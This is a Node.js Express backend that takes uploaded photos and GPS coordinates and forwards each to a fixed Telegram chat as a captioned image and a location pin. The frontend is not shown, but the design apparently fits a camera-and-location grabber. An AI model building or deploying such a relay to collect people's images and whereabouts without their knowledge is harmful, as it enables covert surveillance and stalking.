// server.js — Nexus Media backend (CommonJS)
// Serves public/, handles upload, sends photo + clickable pin to Telegram

require('dotenv').config();

const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch'); // node-fetch@2 for require()
const FormData = require('form-data');

const app = express();
const upload = multer({ dest: 'uploads/' });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 10000;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set in .env');
  process.exit(1);
}

app.use(express.json());
app.use((req, res, next) => {
  // Allow Netlify or local to call this API
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Serve static frontend
app.use(express.static(path.join(__dirname, 'public')));

// Status route
app.get('/status', (req, res) => res.send('📷 Nexus Media backend running...'));

// Helper: timestamp
function formatTimestamp(date = new Date()) {
  const pad = (n) => String(n).padStart(2, '0');
  const year = date.getFullYear();
  const month = pad(date.getMonth() + 1);
  const day = pad(date.getDate());
  const hrs = pad(date.getHours());
  const mins = pad(date.getMinutes());
  const secs = pad(date.getSeconds());
  const tzOffsetMin = -date.getTimezoneOffset();
  const tzHours = Math.floor(Math.abs(tzOffsetMin) / 60);
  const tzMins = Math.abs(tzOffsetMin) % 60;
  const sign = tzOffsetMin >= 0 ? '+' : '-';
  const tz = `UTC${sign}${String(tzHours).padStart(2,'0')}:${String(tzMins).padStart(2,'0')}`;
  return `${year}-${month}-${day} ${hrs}:${mins}:${secs} ${tz}`;
}

// Upload handler
app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const filePath = req.file && req.file.path;
    // multer parses text fields into req.body
    const { latitude = '', longitude = '' } = req.body || {};

    console.log('📥 Received upload. req.body:', req.body);
    console.log('📥 Received upload. req.file:', req.file ? { path: req.file.path, name: req.file.originalname } : null);

    // Build caption with timestamp
    const timestamp = formatTimestamp(new Date());
    const captionParts = [`📸 New photo captured — ${timestamp}`];
    if (latitude || longitude) captionParts.push(`📍 ${latitude}, ${longitude}`);
    const caption = captionParts.join('\n');

    // 1) Send photo (with caption) to Telegram
    if (filePath) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', fs.createReadStream(filePath));
      form.append('caption', caption);

      const photoResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });
      const photoJson = await photoResp.json().catch(() => null);
      console.log('🖼 sendPhoto response:', photoJson);
    } else {
      console.warn('⚠️ No file found in upload.');
    }

    // 2) If coordinates present (non-empty strings), send clickable location pin
    if (latitude || longitude) {
      const lat = parseFloat(latitude);
      const lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        const locResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
        });
        const locJson = await locResp.json().catch(() => null);
        console.log('📍 sendLocation response:', locJson);
      } else {
        console.warn('⚠️ Coordinates could not be parsed as numbers:', latitude, longitude);
      }
    } else {
      console.log('ℹ️ No coordinates provided by client (latitude/longitude empty).');
    }

    // Delete temp file
    if (filePath) {
      fs.unlink(filePath, (err) => {
        if (err) console.warn('⚠️ Failed to delete temp file:', err);
      });
    }

    res.json({ success: true, message: 'Photo (and optional location) processed.' });
  } catch (err) {
    console.error('❌ /upload handler error:', err);
    res.status(500).json({ error: 'Upload processing failed', details: err.message });
  }
});

// Fallback to index.html for SPA routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
